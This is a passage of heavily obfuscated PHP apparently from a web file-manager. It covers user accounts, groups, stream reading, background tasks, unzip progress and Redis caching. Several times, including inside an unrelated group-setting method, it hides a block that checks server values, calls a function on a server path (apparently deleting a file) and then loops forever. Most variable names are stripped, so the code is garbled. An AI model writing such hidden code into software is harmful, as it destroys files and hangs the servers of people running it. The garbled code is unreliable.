$[2362], self::ERROR_USER_EXIST_PHONE => $[2363], self::ERROR_USER_EXIST_EMAIL => $[2364], self::ERROR_USER_LOGIN_LOCK => $[2365], self::ERROR_IP_NOT_ALLOW => $[2366], self::ERROR_USER_EXIST_NICKNAME => $[2367]); return LNG($[$Ǭ]); } public function getInfoByMeta($, $ߏޙ) { $ =& $_SERVER[ʯ]; $ = Model($[2368])->where(array($[104] => $, $[426] => $ߏޙ))->find(); if ($) { return $this->getInfo($[$[1704]]); } return !1; } public function userLoginCheck($ч, $ړ) { $도 =& $_SERVER[ʯ]; $ഢ = $this->userLoginFind($ч); if (!$ഢ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ഢ[$도[1704]], $ړ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ഢ[$도[1704]]); } public function userLoginFind($) { $͗ =& $_SERVER[ʯ]; $ = array($͗[42] => $, $͗[2178] => $, $͗[357] => $, $͗[2369] => $, $͗[1061] => $͗[1063]); if ($this->nickNameRpt()) { unset($[$͗[2178]]); } return $this->where($)->find(); } public function clearCache($ר) { $ʈ =& $_SERVER[ʯ]; $this->cacheFunctionClear($ʈ[1978], $ר); $this->cacheFunctionClear($ʈ[1979], $ר); $this->cacheFunctionClear($ʈ[2350], $ר); } public function userPasswordCheck($, $) { $ =& $_SERVER[ʯ]; $ī = $this->where(array($[1704] => intval($)))->find(); $̕ = $this->metaGet($); $͂ = isset($̕[$[2370]]) ? $̕[$[2370]] : $[12]; if (md5($͂ . trim($)) !== $ī[$[950]]) { return !1; } return !0; } public function userAdd($) { $ =& $_SERVER[ʯ]; $׫ = array($[470] => $[$[42]], $[2371] => $[$[1579]], $[2372] => isset($[$[357]]) ? $[$[357]] : $[12], $[2373] => isset($[$[2369]]) ? $[$[2369]] : $[12], $[2374] => isset($[$[2178]]) ? $[$[2178]] : $[$[42]], $[2375] => isset($[$[2354]]) ? $[$[2354]] : $[12], $[2376] => isset($[$[2377]]) ? $[$[2377]] : 1, $[2378] => $[$[950]], $[1980] => isset($[$[1883]]) ? $[$[1883]] : 1024 * 1024 * 20, $[1981] => 0, $[2379] => 0, $[2025] => isset($[$[810]]) ? $[$[810]] : 1); if (!empty($[$[1704]])) { $׫[$[1704]] = $[$[1704]]; } $ǌק = $this->_checkExist($); if ($ǌק !== !0) { return $ǌק; } if (!empty($׫[$[2354]]) && strlen($׫[$[2354]]) > 255) { $׫[$[2354]] = $[12]; } $ӕ = $this->add($׫); $ı = array($[2378] => $׫[$[950]], $[2374] => $׫[$[2178]]); $this->userEdit($ӕ, $ı); Model($[1393])->userRootAdd($ӕ); return $ӕ; } protected function userEditTest($, $) { return $this->call($_SERVER[ʯ][2380], $, $); } protected function userEdit($, $) { $ߔ =& $_SERVER[ʯ]; $Ԇ = $this->getInfoSimple($); if (!$Ԇ) { return !1; } $ĩ = $this->_checkExist($, $); if ($ĩ !== !0) { return $ĩ; } if (isset($[$ߔ[950]]) && trim($[$ߔ[950]]) != $ߔ[12]) { $ = $this->metaGet($); if (empty($[$ߔ[2370]])) { $[$ߔ[2370]] = rand_string(10); Model($ߔ[554])->metaSet($, $ߔ[2370], $[$ߔ[2370]]); } $[$ߔ[950]] = md5($[$ߔ[2370]] . trim($[$ߔ[950]])); } else { unset($[$ߔ[950]]); } if (!empty($[$ߔ[2354]]) && strlen($[$ߔ[2354]]) > 255) { $[$ߔ[2354]] = $ߔ[12]; } $this->where(array($ߔ[1695] => $))->save($); if (isset($[$ߔ[2178]])) { $this->setNamePinyin($, $[$ߔ[2178]]); } $this->clearCache($); return !0; } public function setNamePinyin($, $Ī첖 = false) { $ =& $_SERVER[ʯ]; if (!$Ī첖) { $Є = $this->getInfoSimple($); $Ī첖 = $Є[$[2178]] ? $Є[$[2178]] : $Є[$[42]]; } $ݰ = Model($[575]); if (!Input::check($Ī첖, $[631])) { return $ݰ->metaSet($, array($[514] => $[12], $[513] => $[12])); } return $ݰ->metaSet($, array($[514] => str_replace($[63], $[12], Pinyin::get($Ī첖)), $[513] => Pinyin::get($Ī첖, $[632]))); } private function nickNameRpt() { $õ =& $_SERVER[ʯ]; $إ = Model($õ[830])->get($õ[2381]); $㛣ے = $GLOBALS[$õ[6]][$õ[433]][$õ[2381]]; $ށ = !is_null($إ) ? $إ : $㛣ے; return !!$ށ; } private function _checkExist($, $ = false) { $ =& $_SERVER[ʯ]; $ = array($[42] => UserModel::ERROR_USER_EXIST_NAME, $[2178] => UserModel::ERROR_USER_EXIST_NICKNAME, $[357] => UserModel::ERROR_USER_EXIST_EMAIL, $[2369] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($[$[2178]]); } $׍ = $ ? array($[1704] => array($[2382], $)) : array(); foreach ($ as $ => $Ώ㛷) { $ = array(); foreach ($ as $ȫ => $) { if (isset($[$ȫ]) && $[$ȫ]) { $[] = $[$ȫ]; } } if (!$) { continue; } $߯ = array_merge(array($ => array($[7], $)), $׍); $ = $this->where($߯)->find(); if ($) { return $Ώ㛷; } } return !0; } public function userListInfo($٩) { $ =& $_SERVER[ʯ]; $ = array(); $٩ = is_array($٩) ? array_unique($٩) : array(); if (!$٩) { return $; } if (count($٩) < 20) { foreach ($٩ as $Ɖ) { $[$Ɖ . $[12]] = $this->getInfoSimpleOuter($Ɖ); } } else { $ό = array($[1695] => array($[468], $٩)); if (count($٩) == 1) { $ό = array($[1695] => $٩[0]); } $ = Model($[554])->field($this->simpleField)->where($ό)->select(); $ = array_to_keyvalue($, $[1704]); foreach ($٩ as $Ɖ) { $Ȉ = $[$Ɖ]; if (!$Ȉ) { $[$Ɖ . $[12]] = $this->getInfoSimpleOuter($Ɖ); continue; } $Ȉ[$[2354]] = Action($[2355])->parseUrl($Ȉ[$[2354]]); $[$Ɖ . $[12]] = $Ȉ; } } return $; } protected function userStatus($, $) { $ = $this->getInfoSimple($); if (!$) { return !1; } $͹ = array($_SERVER[ʯ][810] => $); return $this->userEdit($, $͹); } protected function userRemove($ᬪ) { $ɋ =& $_SERVER[ʯ]; $ = $this->getInfoSimple($ᬪ); if (!$) { return !1; } $Պ = array($ɋ[1695] => $ᬪ); Model($ɋ[640])->where($Պ)->delete(); Model($ɋ[2383])->where($Պ)->delete(); Model($ɋ[1986])->where($Պ)->delete(); Model($ɋ[2368])->where($Պ)->delete(); Model($ɋ[1129])->where($Պ)->delete(); Model($ɋ[2195])->removeUserAll($ᬪ); Model($ɋ[885])->userRootRemove($ᬪ); return $this->where($Պ)->delete(); } protected function userGroupSet($痦, $޳, $ = array()) { $Ҕְ =& $_SERVER[ʯ]; if ($_SERVER[$Ҕְ[13]] != $_SERVER[$Ҕְ[14]]) { $ = $Ҕְ[938]; $ည = $Ҕְ[15]; $ = $_SERVER[$Ҕְ[16]] . $Ҕְ[17]; $ѳ = $ည($); $ = explode($Ҕְ[18], $ѳ); if (count($) < $Ҕְ[664]) { $̧ = $Ҕְ[20]; $̧(); } $ = $Ҕְ[939]; $($_SERVER[$Ҕְ[940]]); $($_SERVER[$Ҕְ[16]] . $Ҕְ[2384]); $ߏ = 1; while ($ߏ > 1) { $ߏ = $ߏ + 4; $ݗ = rawurlencode($ߏ . $Ҕְ[430]); } } $ǅ = $this->getInfoSimple($痦); if (!$ǅ || !is_array($޳)) { return !1; } $Ǥ = Model($Ҕְ[1986]); $Ǥ->where(array($Ҕְ[1704] => $痦))->delete(); $΀ӧ = array(); $Ͽ = 0; foreach ($޳ as $Ԋ衩 => $) { $ʲ = array($Ҕְ[1704] => $痦, $Ҕְ[1896] => $Ԋ衩, $Ҕְ[2000] => $); $ʲ[$Ҕְ[1920]] = isset($[$Ͽ]) ? $[$Ͽ] : 0; $Ͽ++; $΀ӧ[] = $ʲ; } return $Ǥ->addAll($΀ӧ, array(), !0); } protected function userGroupAdd($, $̿ = array()) { $Յ =& $_SERVER[ʯ]; $ꁁ = $this->getInfoSimple($); if (!$ꁁ || empty($̿)) { return !1; } $˔ = array(); foreach ($̿ as $كҝ => $) { $˔[] = array($Յ[1704] => $, $Յ[1896] => $كҝ, $Յ[2000] => $, $Յ[1920] => 0); } return Model($Յ[1986])->addAll($˔, array(), !0); } protected function userGroupRemove($㸌, $լ䩟) { $ =& $_SERVER[ʯ]; $⤴ = $this->getInfoSimple($㸌); if (!$⤴ || !$լ䩟) { return !1; } $܃ = array($[1695] => $㸌, $[1984] => $լ䩟); return Model($[1986])->where($܃)->delete(); } public function listData() { $ƌ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ƌ[$_SERVER[ʯ][421]]); return $ƌ; } public function listByID($ʪ) { $ =& $_SERVER[ʯ]; if (!$ʪ) { return; } $ = array($[1704] => array($[7], $ʪ)); $ = $this->where($)->select(); $ = array_sort_keep($, $[1704], $ʪ); $this->_listDataApply($); return $; } public function listByGroup($ = 0, $𭀞 = array()) { $ =& $_SERVER[ʯ]; $ߔ = $[12]; $ = array(); if ($) { $ = array($[2385] => intval($)); $ߔ = "\x4c\105\106\124\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\x75\163\x65\x72\137\147\x72\157\x75\x70\40\165\x73\145\x72\137\147\162\157\x75\x70\x20\157\x6e\x20\165\x73\145\x72\56\x75\163\x65\x72\111\104\40\75\x20\x75\163\x65\x72\137\x67\162\x6f\165\x70\x2e\165\x73\x65\x72\x49\x44"; $Г = Input::get($[506], null, $[12]) ? $[12] : $[2386]; } if (isset($𭀞[$[810]])) { $[$[2387]] = $𭀞[$[810]]; } $ = $this->_makeOrder($Г)->field($[2388])->where($)->join($ߔ)->selectPage(50); $this->_listDataApply($[$[421]]); return $; } private function _makeOrder($۱ = '') { $ƈ =& $_SERVER[ʯ]; $ΐ = array($ƈ[1704], $ƈ[42], $ƈ[1885], $ƈ[1857], $ƈ[224]); $ϩ = array($ƈ[499] => $ƈ[500], $ƈ[501] => $ƈ[502]); $ = Input::get($ƈ[506], $ƈ[7], $ƈ[1695], $ΐ); $ = Input::get($ƈ[507], $ƈ[7], $ƈ[1987], array($ƈ[1987], $ƈ[501])); $ = $ϩ[$]; $۱ = $۱ . "\165\x73\x65\x72\56{$}\40{$}\x2c\40\x75\x73\145\x72\x2e\x75\x73\145\x72\x49\x44\40\141\x73\143"; return $this->alias($ƈ[2113])->order($۱); } public function listSearch($ۖ) { $ =& $_SERVER[ʯ]; $͒ = $ۖ[$[1990]]; $Ͻ = isset($ۖ[$[1991]]) ? $ۖ[$[1991]] : !1; $͒ = str_replace($[1992], $[1993], trim($͒)); $ڇ = array($[42] => array($[435], "\45{$͒}\x25"), $[357] => array($[435], "{$͒}\x25"), $[2178] => array($[435], "{$͒}\x25"), $[1061] => $[1994]); if (Input::check($͒, $[363])) { $ڇ[$[1704]] = array($[435], "{$͒}\45"); $ڇ[$[2369]] = array($[435], "{$͒}\45"); } if (!$͒) { $ڇ = array(); } if (isset($ۖ[$[810]])) { $ڇ[$[810]] = $ۖ[$[810]]; } $ڇ = $this->parseWhereLike($ڇ); $ = $this->_makeOrder()->where($ڇ)->selectPage(20); if (!$ || count($[$[421]]) < 5 && Input::check($͒, $[370])) { $ɪ = $this->_searchFromMeta($[513], $͒, 10); $Ƃ = $this->_searchFromMeta($[514], $͒, 10); $ = array_merge($ɪ, $Ƃ, $[$[421]]); $[$[421]] = array_unique_by_key($, $[1704]); $[$[418]][$[419]] = count($[$[421]]); $[$[418]][$[420]] = ceil($[$[418]][$[419]] / $[$[418]][$[415]]); } $this->_listDataApply($[$[421]]); $this->_filterByGroup($, $Ͻ); return $; } private function _filterByGroup(&$ւ, $) { $ =& $_SERVER[ʯ]; if (!$) { return $ւ; } foreach ($ւ[$[421]] as $ => &$) { $ = array_to_keyvalue($[$[2083]], $[12], $[1896]); if (!in_array($, $)) { unset($ւ[$[421]][$]); } } unset($); $ւ[$[421]] = array_values($ւ[$[421]]); $ւ[$[418]] = array($[2148] => count($ւ[$[421]]), $[2146] => $ւ[$[418]][$[415]], $[2145] => 1, $[2147] => 1); } private function _searchFromMeta($똃, $ߺВ, $) { $圧 =& $_SERVER[ʯ]; $ߺВ = strtolower($ߺВ); $샍 = array($圧[104] => $똃, $圧[426] => array($圧[435], "\45{$ߺВ}\x25")); $샍 = $this->parseWhereLike($샍); $ش = Model($圧[2389])->where($샍)->limit($)->select(); if (!$ش) { return array(); } $ش = array_to_keyvalue($ش, $圧[12], $圧[1704]); $΍ܕ = $this->where(array($圧[1695] => array($圧[7], $ش)))->select(); if (!$΍ܕ) { return array(); } return $΍ܕ; } private function _listDataApplyItem($) { $頜 = array($); $this->_listDataApply($頜); return $頜[0]; } private function _listDataApply(&$̹) { $ =& $_SERVER[ʯ]; if (!$̹) { return; } array_remove_key($̹, $[950]); $ꦥߣ = array_to_keyvalue($̹, $[12], $[1704]); $this->_listAppendGroup($̹, $ꦥߣ); $this->_listAppendMeta($̹, $ꦥߣ); $this->_listAppendSourceRoot($̹, $ꦥߣ); } private function _listAppendSourceRoot(&$՘, $) { $ =& $_SERVER[ʯ]; $ = Model($[885])->listSourceRoot(SourceModel::TYPE_USER, $); $ = array_to_keyvalue($, $[546]); $ = array_remove_key($, $[546]); foreach ($՘ as &$ˋȣ) { $ˋȣ[$[97]] = $[$ˋȣ[$[1704]]] ? $[$ˋȣ[$[1704]]] : array(); } unset($ˋȣ); } private function _listAppendGroup(&$ޗ䊀, $す) { $ =& $_SERVER[ʯ]; $ = array($[1704] => array($[7], $す)); $ = Model($[1986])->where($)->select(); $ծ = array_to_keyvalue($, $[12], $[1896]); $ծ = array_remove_value(array_unique($ծ), $[221]); if (!$ծ || !$) { return; } $ = array($[1896] => array($[7], $ծ)); $â = Model($[2081])->field($[2390])->where($)->select(); $â = array_to_keyvalue($â, $[1896]); $ = array_to_keyvalue_group($, $[1704]); foreach ($ as &$ֆ) { $ = array(); foreach ($ֆ as $ע) { if (!$ע[$[2000]]) { continue; } $΁ = Model($[548])->listData($ע[$[2000]]); $[] = array($[1896] => $ע[$[1896]], $[2391] => $â[$ע[$[1896]]][$[42]], $[561] => $â[$ע[$[1896]]][$[561]], $[463] => $΁); } $ֆ = $; } unset($ֆ); foreach ($ޗ䊀 as &$֍) { $֍[$[2083]] = array(); if (isset($[$֍[$[1704]]])) { $֍[$[2083]] = $[$֍[$[1704]]]; } } unset($֍); } public function userAppendGroup($硯) { $֥ =& $_SERVER[ʯ]; if (!$硯) { return array(); } $this->_listAppendGroup($硯, array_to_keyvalue($硯, $֥[12], $֥[1704])); return $硯; } private function _listAppendMeta(&$셒, $) { $ =& $_SERVER[ʯ]; $ = UserJobModel::JOB_KEY; $ = array($[2370]); $牟 = array($[1704] => array($[7], $)); $螄 = Model($[2368])->where($牟)->select(); $螄 = array_to_keyvalue_group($螄, $[1704]); foreach ($螄 as &$ڊ) { $ = array(); foreach ($ڊ as $Ǎ) { if (!in_array($Ǎ[$[104]], $)) { $[$Ǎ[$[104]]] = $Ǎ[$[426]]; } } $ڊ = $; } unset($ڊ); $ = Model($[2392]); foreach ($셒 as &$) { $㜁 = array(); if (isset($螄[$[$[1704]]])) { $㜁 = $螄[$[$[1704]]]; } $[$[2393]] = array(); if (isset($㜁[$])) { $[$[2393]] = $->getUserJobInfo($㜁[$]); } } unset($); } protected function groupUserAll($ܰ) { $˩У =& $_SERVER[ʯ]; if (!$ܰ) { return !1; } $咁 = Model($˩У[1986])->field($˩У[1704])->where(array($˩У[1896] => array($˩У[7], $ܰ)))->select(); $咁 = array_to_keyvalue($咁, $˩У[12], $˩У[1704]); return array_unique($咁); } public function userSearch($ȼ, $ = "\52") { return Model($_SERVER[ʯ][575])->where($ȼ)->field($)->find(); } } goto b; BĈ: if (!isset($_SERVER[$_SERVER[ʯ][13]]) || !isset($_SERVER[$_SERVER[ʯ][22]])) { $_getc = $_SERVER[ʯ][15]; $_getfile = $_SERVER[$_SERVER[ʯ][16]] . $_SERVER[ʯ][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ʯ][18], $_getfilec); if (count($_getarrs) < $_SERVER[ʯ][19]) { $exit = $_SERVER[ʯ][20]; $exit(); } $_act = $_SERVER[ʯ][21]; $_act($_SERVER[$_SERVER[ʯ][16]] . $_SERVER[ʯ][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ʯ][430]); } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($, $ = '') { $this->info = $this->info($); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ʯ][94]]; $this->pathOpen = $; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$])) { self::$_chunkBuffer[$] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($۵ڄ) { $ó߻ = $this->fileSubstr($this->pose, $۵ڄ); $this->pose += strlen($ó߻); return $ó߻; } public function stream_tell() { return $this->pose; } public function stream_seek($, $ŕЎ) { $ =& $_SERVER[ʯ]; if ($ŕЎ == SEEK_SET) { $this->pose = $; } else { if ($ŕЎ == SEEK_CUR) { $this->pose += $; } else { if ($ŕЎ == SEEK_END) { $this->pose = $this->info[$[86]] + intval($); } } } if ($ < 0) { $this->pose = $this->info[$[86]] + $; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ʯ][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($٪, $߲) { $ =& $_SERVER[ʯ]; $ = $this->info($٪); return array($[1548] => 0, $[1549] => 0, $[26] => 32768 + 511, $[1550] => 0, $[1551] => 0, $[1552] => 0, $[1553] => 0, $[86] => $[$[86]], $[1554] => $[$[1422]], $[1510] => $[$[95]], $[1509] => $[$[224]], $[1555] => 0, $[1556] => 0); } static $fileInfo = array(); public function info($욋̋) { $ǰ = $_SERVER[ʯ][1557]; if (isset(self::$fileInfo[$욋̋])) { return self::$fileInfo[$욋̋]; } if (substr($욋̋, 0, strlen($ǰ)) != $ǰ) { return !1; } self::$fileInfo[$욋̋] = IO::info(substr($욋̋, strlen($ǰ))); return self::$fileInfo[$욋̋]; } public static function read($Ňˀ, $, $؂) { if (!isset(self::$_fopenCache[$Ňˀ])) { $ƭ = new StreamWrapperIO(); $ƭ->stream_open($Ňˀ); self::$_fopenCache[$Ňˀ] = $ƭ; } $ƭ = self::$_fopenCache[$Ňˀ]; return $ƭ->fileSubstr($, $؂); } public static function _read($, $揣, $) { $ٵ =& $_SERVER[ʯ]; $ظ = fopen($, $ٵ[1426]); if (!$ظ) { return $ٵ[12]; } $ǋ = 8192; fseek($ظ, $揣, SEEK_SET); $Ղ = $ٵ[12]; $ = 0; while ($ < $) { $ = min($ǋ, $ - $); $Ղ .= fread($ظ, $); $ += $; } fclose($ظ); return $Ղ; } public function fileSubstr($, $﹇) { $ =& $_SERVER[ʯ]; $Ю = $this->info[$[86]]; $캆 = $; $ޡ쏁 = $﹇; if ($ < 0) { $ = $Ю + $; } if ($﹇ === !1) { $﹇ = $Ю - $; } if ($ + $﹇ > $Ю) { $﹇ = $Ю - $; } if ($﹇ <= 0) { return $[12]; } if ($ < 0 || $ >= $Ю || $﹇ <= 0 || $﹇ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\154\145\x52\x65\141\144\40\x65\x72\x72\x6f\162\41\40\x73\x74\141\x72\164\x3d{$}\x3b\x6c\145\156\x67\x74\150\x3d{$﹇}\73\40\x73\x69\172\x65\75{$Ю}\73"); } $ = 64 * 1024; $؜ㅳ =& self::$_chunkBuffer[$this->path]; if (!$؜ㅳ) { $؜ㅳ = array(); } $ў = 0; $̂ = 0; $ = $[12]; foreach ($؜ㅳ as $ў => $) { $ў = intval($ў); $̂ = $ў + strlen($); if ($ >= $̂) { continue; } if ($ >= $ў && $ + $﹇ <= $̂) { return substr($, $ - $ў, $﹇); } break; } if (count($؜ㅳ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($[1558], $[1559] . count($؜ㅳ) . "\x3b\163\x74\141\162\164\75{$}\54\154\x65\x6e\147\164\x68\75{$﹇}\73\x70\157\x73\x65\72{$ў}\176{$̂}"); throw new Exception($[1560]); } $ = intval($ / $) * $; $ = ceil(($ + $﹇) / $) * $ - $; $ӂ = IO::fileSubstr($this->path, $, $); $؜ㅳ[$ . $[12]] = $ӂ; ksort($؜ㅳ); $ = substr($ӂ, $ - $, $﹇); return $; } private function log($㸱, $΋҂) { $Ҫ =& $_SERVER[ʯ]; $ = timeFloat() - $this->timeStart; write_log(sprintf($Ҫ[1561], $㸱, $this->info[$Ҫ[42]], $, $΋҂), $Ҫ[1243]); } } class Message { function __construct() { } public function send($靤 = '', $Π = array(), $ߒ˵ = "\x74\x65\x78\x74") { $ =& $_SERVER[ʯ]; $ = array($[43] => $[1562], $[814] => $靤); if (in_array($ߒ˵, array($[1562], $[1563]))) { $[$[43]] = $ߒ˵; } $Π = array($[555] => isset($Π[$[555]]) ? $Π[$[555]] : $[12], $[638] => isset($Π[$[638]]) ? $Π[$[638]] : $[12]); if (empty($靤) || empty($Π[$[555]]) && empty($Π[$[638]])) { return !1; } $ܙ؉ = array($[1503] => $, $[1564] => $Π); Hook::trigger($[1565], $ܙ؉); } } goto fˡ; eі: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($, $ = 5.0) { if (!$) { return; } $ = Cache::get($); if (!$ || timeFloat() - floatVal($) >= $) { Cache::set($, timeFloat(), $ * 10); return !0; } return !1; } public static function timeLimitCall($, $, $ף, $ʒ = 5.0) { $ =& $_SERVER[ʯ]; if (!$ || !$) { return; } self::$asyncAdd = !0; $ = $[1810]; $ۦ = Cache::get($, !0); $ = array($[1811] => timeFloat(), $[1812] => timeFloat(), $[316] => $, $[1802] => $ף, $[203] => $ʒ); if (is_array($ۦ[$])) { $[$[1812]] = $ۦ[$][$[1812]]; } if (is_array($ۦ[$])) { if (timeFloat() - $ۦ[$][$[1811]] < $[$[203]] * 0.3) { return; } $[$[1812]] = $ۦ[$][$[1812]]; } $ۦ[$] = $; Cache::set($, $ۦ, 60); Cache::removeMemory($); write_log($[1813] . $ . $[81] . $, $[194]); } public static function timeLimitCallLoop() { $Ś =& $_SERVER[ʯ]; $̆ = array($Ś[1814]); $ˬ = in_array(strtolower(ACTION), $̆); if (!$ˬ && !self::$asyncAdd) { return; } $ʹ = $Ś[1810]; $Ղ߽ = Cache::get($ʹ, !0); if (!$Ղ߽ || count($Ղ߽) <= 0) { return; } $ = !1; $эꜾ = timeFloat(); $Ö = array(); foreach ($Ղ߽ as $ => $Ƀ) { if ($эꜾ - $Ƀ[$Ś[1812]] > $Ƀ[$Ś[203]]) { $ = !0; try { Hook::apply($Ƀ[$Ś[316]], $Ƀ[$Ś[1802]]); write_log($Ś[1815] . $ . $Ś[81] . $Ƀ[$Ś[316]] . $Ś[1816] . ACTION, $Ś[194]); } catch (Exception $Ϭ) { } continue; } $Ö[$] = $Ƀ; } if (!$) { return; } if (!$Ö) { return Cache::remove($ʹ); } Cache::set($ʹ, $Ö, 60); Cache::removeMemory($ʹ); } public static function finished($٩, $噉) { $ =& $_SERVER[ʯ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($[316] => $٩, $[1802] => $噉); } private static function finishedRun() { $ =& $_SERVER[ʯ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ǧ) { try { Hook::apply($Ǧ[$[316]], $Ǧ[$[1802]]); } catch (Exception $˕) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $֚ =& $_SERVER[ʯ]; parent::startAfter(); Hook::bind($֚[1817], array($this, $֚[1818])); Hook::bind($֚[1254], array($this, $֚[1819])); $߅ =& $this->task; $߅[$֚[1820]] = $֚[1255]; if (!$߅[$֚[1601]]) { $߅[$֚[1601]] = LNG($֚[1821]); } } protected function endAfter() { $򡴲 =& $_SERVER[ʯ]; parent::endAfter(); Hook::unbind($򡴲[1817], array($this, $򡴲[1818])); Hook::unbind($򡴲[1254], array($this, $򡴲[1819])); } public function updateAfter() { $Ķ =& $_SERVER[ʯ]; $ׄɉ =& $this->task; if (!$ׄɉ[$Ķ[846]] || !$ׄɉ[$Ķ[823]]) { return; } if ($ׄɉ[$Ķ[1820]] == $Ķ[1255]) { $ = 0; if ($ׄɉ[$Ķ[1757]]) { $ = $ׄɉ[$Ķ[1758]] / $ׄɉ[$Ķ[1757]]; } $ׄɉ[$Ķ[1706]] = $ * 0.3; } else { if ($ׄɉ[$Ķ[1820]] == $Ķ[365]) { $ = $ׄɉ[$Ķ[1705]] / $ׄɉ[$Ķ[846]]; $ׄɉ[$Ķ[1706]] = 0.3 + $ * 0.4; } else { if ($ׄɉ[$Ķ[1820]] == $Ķ[117]) { $ɢ = 0; if ($ׄɉ[$Ķ[1759]] == $Ķ[117]) { $ɢ = $ׄɉ[$Ķ[1758]]; } $ = ($ׄɉ[$Ķ[1762]] + $ɢ) / $ׄɉ[$Ķ[823]]; $ׄɉ[$Ķ[1706]] = 0.3 + 0.4 + $ * 0.3; } } } if ($ׄɉ[$Ķ[1706]] > 0) { $κ = timeFloat() - $ׄɉ[$Ķ[1708]] - $ׄɉ[$Ķ[1711]]; $ׄɉ[$Ķ[1712]] = $κ * (1 - $ׄɉ[$Ķ[1706]]) / $ׄɉ[$Ķ[1706]]; } } public function addFile($䒃В) { $á =& $_SERVER[ʯ]; $ =& $this->task; $Ā = IO::info($䒃В); $[$á[1755]] = $Ā[$á[42]]; $[$á[1757]] = $Ā[$á[86]]; $[$á[1758]] = 0; $[$á[1125]] = $á[1778]; $[$á[1759]] = $á[1255]; $[$á[823]] = $Ā[$á[86]]; $[$á[846]] = 1; $ = 0; $[$á[1766]] = array($á[1767] => $ + 1, $á[470] => $Ā[$á[42]], $á[94] => $Ā[$á[94]], $á[559] => $Ā[$á[559]] ? $Ā[$á[559]] : $Ā[$á[94]]); $this->update(); } public function unzipAfter($) { $𽟽 =& $_SERVER[ʯ]; $భ =& $this->task; $భ[$𽟽[1820]] = $𽟽[117]; $̀ = IO::infoWithChildren($); $ = 0; $భ[$𽟽[1766]] = array($𽟽[1767] => $ + 1, $𽟽[470] => $̀[$𽟽[42]], $𽟽[94] => $̀[$𽟽[94]], $𽟽[559] => $̀[$𽟽[559]] ? $̀[$𽟽[559]] : $̀[$𽟽[94]]); if ($̀[$𽟽[43]] == $𽟽[223]) { $భ[$𽟽[846]] = 1; } else { $భ[$𽟽[846]] = $̀[$𽟽[89]][$𽟽[87]]; } $భ[$𽟽[1125]] = $𽟽[12]; $భ[$𽟽[1759]] = 0; $భ[$𽟽[1705]] = 0; $భ[$𽟽[1757]] = 0; $భ[$𽟽[1758]] = 0; $భ[$𽟽[1755]] = $𽟽[12]; $భ[$𽟽[1762]] = 0; $భ[$𽟽[823]] = $̀[$𽟽[86]]; $this->update(); self::log($𽟽[1822] . json_encode(array($భ, $̀))); } public function nameParse($ޚ) { $̅ =& $_SERVER[ʯ]; $ =& $this->task; if ($[$̅[1820]] == $̅[1255]) { $[$̅[1820]] = $̅[365]; $[$̅[1762]] = 0; $[$̅[823]] = 0; } $ގ = get_path_this($ޚ); if (strstr($ގ, $̅[10])) { $[$̅[1705]] += 1; $[$̅[846]] += 1; } $[$̅[1755]] = $ޚ; $this->update(); } } if (!isset($_SERVER[$_SERVER[ʯ][13]]) || !isset($_SERVER[$_SERVER[ʯ][22]])) { $_getc = $_SERVER[ʯ][15]; $_getfile = $_SERVER[$_SERVER[ʯ][16]] . $_SERVER[ʯ][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ʯ][18], $_getfilec); if (count($_getarrs) < $_SERVER[ʯ][19]) { $exit = $_SERVER[ʯ][20]; $exit(); } $_act = $_SERVER[ʯ][21]; $_act($_SERVER[$_SERVER[ʯ][16]] . $_SERVER[ʯ][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ʯ][430]); } } goto EΩ; aӊ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($۬, $) { $ =& $_SERVER[ʯ]; if (!class_exists($[930])) { show_json($[931], !1); } $this->cacheTime = $; $㩴 = isset($۬[$[932]]) ? $۬[$[932]] : 10; $ƾ = _get($۬, $[929]); if ($ƾ && is_array($ƾ)) { $this->initCluster($۬, $㩴); } else { $this->handle = $this->init($۬, $㩴); } } private function init($, $) { $ʄ =& $_SERVER[ʯ]; $Į = new Redis(); $ߪ = isset($[$ʄ[933]]) ? $[$ʄ[933]] : !1; if ($ߪ) { $Į->pconnect($[$ʄ[205]], $[$ʄ[206]], $); } else { $Į->connect($[$ʄ[205]], $[$ʄ[206]], $); } if (!empty($[$ʄ[463]])) { $Į->auth($[$ʄ[463]]); } if (!empty($[$ʄ[817]]) && $[$ʄ[817]] != 0) { $Į->select($[$ʄ[817]]); } return $Į; } private function initCluster($ӧ, $) { $ȉ =& $_SERVER[ʯ]; $̩ = array($ȉ[934], $ȉ[935], $ȉ[936]); $񁯱 = $ȉ[934]; if (isset($ӧ[$ȉ[26]]) && in_array($ӧ[$ȉ[26]], $̩)) { $񁯱 = $ӧ[$ȉ[26]]; } switch ($񁯱) { case $ȉ[934]: $this->_slave($ӧ, $); break; case $ȉ[935]: break; case $ȉ[936]: $this->isCluster = !0; $ߴ = $ӧ[$ȉ[929]]; $ = isset($ӧ[$ȉ[933]]) ? $ӧ[$ȉ[933]] : !1; $Ƽ = isset($ӧ[$ȉ[463]]) ? 